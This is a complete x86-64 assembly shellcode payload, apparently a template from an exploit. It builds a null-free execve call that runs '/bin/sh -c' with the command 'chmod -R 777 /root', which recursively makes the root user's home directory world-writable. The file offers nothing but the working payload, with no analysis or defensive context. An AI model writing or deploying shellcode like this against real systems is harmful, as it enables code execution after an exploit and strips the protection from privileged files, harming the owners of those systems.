BITS 64
start:
xor eax, eax
lea rdi, [rel start]

; insert nulls
push rdi
pop rbx
add rbx, arg1-1-start
mov [rbx], al
add rbx, cmd-arg1
mov [rbx], al
add rbx, end-cmd
mov [rbx], al

push rax                ; NULL
push rsp
pop rdx                 ; envp -> [NULL]

add rdi, bin-start
lea rcx, [rdi+cmd-bin]
push rcx                ; "$CMD$"
lea rcx, [rdi+arg1-bin]
push rcx                ; "-c"
push rdi                ; "/bin/sh"
push rsp
pop rsi                 ; argv -> ["/bin/sh", "-c", "$CMD$", NULL]

mov al, 59              ; __NR_execve
syscall

bin: db "/bin/sh", 0xcc
arg1: db "-c", 0xcc
cmd: db "chmod -R 777 /root", 0xcc
end:
